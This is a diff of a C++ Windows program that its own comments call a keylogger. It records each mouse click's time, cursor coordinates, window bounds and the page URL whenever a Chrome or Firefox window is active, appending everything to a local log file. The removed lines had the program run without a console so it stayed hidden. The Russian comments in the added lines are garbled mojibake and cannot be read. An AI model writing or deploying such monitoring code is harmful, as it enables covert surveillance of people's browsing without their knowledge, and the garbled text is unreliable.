@@ -1,21 +1,24 @@
+п»ї// ConsoleApplication5.cpp: РѕРїСЂРµРґРµР»СЏРµС‚ С‚РѕС‡РєСѓ РІС…РѕРґР° РґР»СЏ РєРѕРЅСЃРѕР»СЊРЅРѕРіРѕ РїСЂРёР»РѕР¶РµРЅРёСЏ.
+// РєРµР№Р»РѕРіРµСЂ , РєРѕС‚РѕСЂС‹Р№ РїСЂРё РєР»РёРєРµ РїРёС€РµС‚ РІ С„Р°Р№Р» РІСЂРµРјСЏ, РєРѕРѕСЂРґРёРЅР°С‚С‹ РєР»РёРєР° Рё РґР°РЅРЅС‹Рµ РёР· РѕРєРЅР° chrome
+
+#include "stdafx.h"
 #include "atltypes.h"
 #include "atlstr.h"
 #include <iostream>
+#include <string>
 #include <psapi.h>
 #include <commdlg.h>
+#include <fstream>
 #include <time.h>
 #include "Header.h"
-#include <string>
-#include <fstream>
-#include <windows.h>
 
 using namespace std;
 
 string get_time_now()
 {
 	/*
-	* Текущее время(вплоть до секунд)
-	*/
+	 * РўРµРєСѓС‰РµРµ РІСЂРµРјСЏ(РІРїР»РѕС‚СЊ РґРѕ СЃРµРєСѓРЅРґ)
+	 */
 	struct tm newtime;
 	char am_pm[] = "AM";
 	time_t long_time;
@@ -44,9 +47,9 @@ string get_time_now()
 
 void keylogger(ofstream &file)
 {
-	/*
-	* кейлоггер
-	*/
+	/* 
+	 * РєРµР№Р»РѕРіРіРµСЂ 
+	 */
 	tm* ptr;
 	time_t seconds;
 	int i;
@@ -54,8 +57,7 @@ void keylogger(ofstream &file)
 	CRect rect;
 	HWND hWnd;
 	string str;
-	ifstream is("status.txt");
-	while (!(is.is_open()))
+	for (i = 1; i < 200; i++)
 	{
 		Sleep(100);
 		if ((GetAsyncKeyState(VK_LBUTTON) != 0) || (GetAsyncKeyState(VK_RBUTTON) != 0) || (GetAsyncKeyState(VK_MBUTTON) != 0))
@@ -66,42 +68,25 @@ void keylogger(ofstream &file)
 			str = get_active_window();
 			if ((str.find("chrome") != string::npos) || (str.find("firefox") != string::npos))
 			{
-				file << get_time_now(); // дата
-										// курсор
-				file << "(" << pt.x << ";" << pt.y << ")\t";
-				// координаты активного окна
-				file << "[(" << rect.left << ";" << rect.top << ");(" << rect.left + rect.Width() << ";" << rect.top + rect.Height() << ")]\t";
-				// url активного окна
+				file << get_time_now(); // РґР°С‚Р°
+				// РєСѓСЂСЃРѕСЂ
+				file << "(" << pt.x  << ";" << pt.y << ")\t";
+				// РєРѕРѕСЂРґРёРЅР°С‚С‹ Р°РєС‚РёРІРЅРѕРіРѕ РѕРєРЅР°
+				file << "[(" << rect.left << ";" << rect.top << ");(" << rect.left+rect.Width() << ";" << rect.top + rect.Height() << ")]\t";
+				// url Р°РєС‚РёРІРЅРѕРіРѕ РѕРєРЅР°
 				file << get_url(str) << endl;
 			}
 		}
-		is.open("status.txt");
 	}
-	is.close();
 }
 
-// запуск без консоли
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdLine, int nCmdShow)
+int main()
 {
 	setlocale(LC_ALL, "rus");
-	ofstream log_file("log.txt", std::ios_base::app);		// лог на дозапись
-
-															// перед началом работы файла статуса не должно существовать
-	ofstream stat_file("status.txt", std::ios_base::app);
-	if (stat_file.is_open())
-		stat_file.close();
-	if (remove("status.txt") == -1)
-		log_file << "error_start_program" << endl;
-
-	//основной код
+	ofstream log_file("1.txt", std::ios_base::app);		// РЅР° РґРѕР·Р°РїРёСЃСЊ
 	while (!log_file.is_open())
-		ofstream log_file("log.txt");
+		ofstream log_file("1.txt");
 	keylogger(log_file);
-
-	// конец работы программы
-	if (remove("status.txt") == -1)
-		log_file << "error_del" << endl;
 	log_file.close();
 	return 0;
 }
-
